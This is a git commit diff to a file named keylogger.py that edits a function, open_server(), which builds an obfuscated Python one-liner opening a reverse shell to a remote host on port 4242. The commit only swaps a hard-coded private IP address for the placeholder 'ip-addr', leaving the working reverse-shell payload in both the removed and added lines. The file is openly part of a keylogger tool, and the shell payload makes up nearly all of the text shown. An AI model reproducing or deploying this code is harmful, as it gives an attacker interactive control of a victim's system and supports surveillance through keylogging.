f1bb493edf366764843ef9c64f72889b4d68e82e
NikitaKovaljov <78376672+NikitaKovaljov@users.noreply.github.com>
2022-02-21 13:55:46 +0200

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -7,11 +7,11 @@ import time
 def open_server():
 	if os.system("which python3"):
 		command = 'python3 -c '
-		command += 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("172.20.10.3",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
+		command += 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("ip-addr",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
 		os.system(command)
 	else:
 		command = 'python -c'
-		command += 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("172.20.10.3",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
+		command += 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("ip-addr",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
 		os.system(command)
 
 def check_file():
